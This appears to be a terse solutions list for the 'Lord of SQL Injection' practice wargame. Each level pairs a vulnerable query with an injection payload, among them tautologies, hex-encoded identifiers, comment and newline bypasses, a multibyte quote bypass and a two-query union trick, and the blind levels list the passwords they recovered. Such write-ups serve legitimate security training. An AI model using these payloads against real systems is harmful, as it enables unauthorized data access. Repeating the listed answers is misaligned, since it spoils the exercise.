# Lord-of-Sql-injection

>gremlin

prob : select id from prob_gremlin where id='' and pw=''

solve : ?id=' or 1=1%23


>cobolt

prob : select id from prob_cobolt where id='' and pw=md5('')

solve : ?id=' or id='admin'%23


>goblin

prob : select id from prob_goblin where id='guest' and no=

solve : ?no=' or id=0x61646d696e


>orc(blind)

prob : select id from prob_orc where id='admin' and pw=''

solve : ?pw=095a9852


>wolfman

prob : select id from prob_wolfman where id='guest' and pw=''

solve : ?pw=%27||id=0x61646d696e%23


>darkelf

prob : select id from prob_darkelf where id='guest' and pw=''

solve : ?pw=%27||id=0x61646d696e%23


>orge(blind)

prob : select id from prob_orge where id='guest' and pw=''

solve : ?pw=7b751aec


>troll

prob : select id from prob_troll where id='ADmin'

solve : ?pw=AdMin


>vampire

prob : select id from prob_vampire where id=''

solve : ?id=adadminmin


>skeleton

prob : select id from prob_skeleton where id='guest' and pw='' and 1=0

solve : ?pw=' or id='admin'%23


>golem(blind)

prob : select id from prob_golem where id='guest' and pw=''

solve : ?pw=77d6290b


>darknight(blind)

prob : select id from prob_darkknight where id='guest' and pw='' and no=

solve : ?pw=0b70ea1f


>bugbear(blind)

prob : select id from prob_bugbear where id='guest' and pw='' and no=

solve : ?pw=52dc3991


>giant

prob : select 1234 from{$_GET[shit]}prob_giant where 1

solve : ?shit=%0b,?shit=%0c


>assasin 

prob : select id from prob_assassin where pw like ''

solve : ?pw=%E%D%

memo : a% , %a , %a%


>zombie_assassin

prob : select id from prob_zombie_assassin where id='' and pw=''

solve : pass

memo : %bf' or 1=1--%20 -> %20--1=1 ro '%bf


>succubus(pass)

>nightmare(pass)


>xavis(blind)

prob : select id from prob_xavis where id='admin' and pw=''

solve : ?pw=우왕굳

memo : 한글 ascii


>dragon

prob : select id from prob_dragon where id='guest'# and pw=''

solve : ?pw='%0aand pw=12311312312312 or id='admin

memo : %0a -> 줄바꿈  # -> 한줄 주석


>iron_golem(error based blind)

prob : select id from prob_iron_golem where id='admin' and pw=''

solve : ?pw=06b5a6c16e8830475f983cc3a825ee9a


>dark_eyes(error based blind)

prob : select id from prob_dark_eyes where id='admin' and pw=''

solve : ?pw=5a2f5d3c


>hell_fire(error based blind)

prob : select id,email,score from prob_hell_fire where 1 order by

solve : ?pw=admin_secure_email@emai1.com


>green_dragon

prob : select id,pw from prob_green_dragon where id='' and pw=''

solve : ?id=\&pw = union select 0x5c,(select 0x756e696f6e2073656c6563742030783631363436643639366523)%23

memo : query1=select id,pw from prob_green_dragon where id='\' and pw='union select 1,2#'
       query2=select id from prob_green_dragon where id='1' and pw='2',
       쿼터 필터링, 
       query1 : id=\&pw = union select 0x5c,(select 0x756e696f6e2073656c6563742030783631363436643639366523)%23 
       query2 : id = \ , pw = union select 0x61646d696e#
       0x5c
       0x756e696f6e2073656c6563742030783631363436643639366523   


>red_dragon(노가다)

prob : select id from prob_red_dragon where id='' and no=1

solve : 586482014

memo : id는 7자리까지, no는 is_numeric함수 사용, #과 개행문자로 우회


>blue_dragon(timed based)

prob : select id from prob_blue_dragon where id='' and pw=''

solve : d948b8a0


